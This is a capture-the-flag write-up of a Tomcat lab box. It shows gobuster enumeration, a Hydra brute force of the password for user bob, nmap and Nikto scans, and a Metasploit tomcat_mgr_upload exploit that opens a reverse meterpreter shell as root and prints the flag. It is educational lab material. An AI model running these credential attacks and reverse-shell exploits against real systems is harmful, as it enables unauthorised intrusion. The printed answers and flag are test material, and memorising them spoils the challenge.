# Toolsarus

IP-adress
'''
10.10.31.199
'''

## Task 1
What directory can you find, that begins with a "g"?
'''
kali@franka:~$ gobuster dir -u http://10.10.31.199 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80                                                                                                                                                                                                           
===============================================================                                                                                                                                                                                                                                                            
Gobuster v3.0.1                                                                                                                                                                                                                                                                                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                                                                                                                                                            
===============================================================                                                                                                                                                                                                                                                            
[+] Url:            http://10.10.31.199                                                                                                                                                                                                                                                                                    
[+] Threads:        80
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/13 15:33:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/guidelines (Status: 301)
/index.html (Status: 200)
/protected (Status: 401)
/server-status (Status: 403)
===============================================================
2020/08/13 15:33:03 Finished
===============================================================
 '''
 ###1
 '''
 Guidelines
 '''
 ###2
 '''
 bob
 '''
 ###3
 Status code 401
 '''
 protected
 '''
 ###4 What is bob's password to the protected part of the website?
kali@franka:~$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.31.199 http-get /protected/ 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 15:49:26
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.31.199:80/protected/
[80][http-get] host: 10.10.31.199   login: bob   password: bubbles
[STATUS] attack finished for 10.10.31.199 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-13 15:49:40
'''
bubbles
'''

#5 What other port that serves a webs service is open on the machine?
ali@franka:~$ nmap -sV -sC 10.10.31.199
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 15:51 CEST
Nmap scan report for 10.10.31.199 (10.10.31.199)
Host is up (0.023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 13:5f:c0:81:1b:b5:49:4f:62:93:db:db:12:c4:b5:d9 (RSA)
|   256 1f:25:38:0c:72:4e:96:51:d0:a9:f1:11:39:82:69:71 (ECDSA)
|_  256 94:92:f9:cb:ad:6d:52:dd:2a:0e:74:2c:23:9c:96:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds

ans:
'''
1234
'''

###6 Going to the service running on that port, what is the name and version of the software?
'''
Apache Tomcat/7.0.88
'''

###7 Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?

Login op de website
'''
5
'''

###8 What is the server version (run the scan against port 80)?
'''
Apache/2.4.18
'''

###9 What version of Apache-Coyote is this service using?
'''
1.1
'''

###10 Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?
'''
root
'''
kali@franka:~$ msfconsole
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging with set HttpTrace true

msf5 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index, for example use 22 or use post/windows/gather/enum_tomcat

msf5 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf5 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.13     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf5 exploit(multi/http/tomcat_mgr_upload) > set httpUsername bob
httpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.31.199
RHOSTS => 10.10.31.199
msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.8.65.165
LHOST => 10.8.65.165
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.65.165:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying MxGhQ5DeQfvOu05K2jeNjkjIrE...
[*] Executing MxGhQ5DeQfvOu05K2jeNjkjIrE...
[*] Undeploying MxGhQ5DeQfvOu05K2jeNjkjIrE ...
[*] Sending stage (53944 bytes) to 10.10.31.199
[*] Meterpreter session 1 opened (10.8.65.165:4444 -> 10.10.31.199:45764) at 2020-08-13 16:12:50 +0200

meterpreter > shell
Process 1 created.
Channel 1 created.

id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag.txt
snap
cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
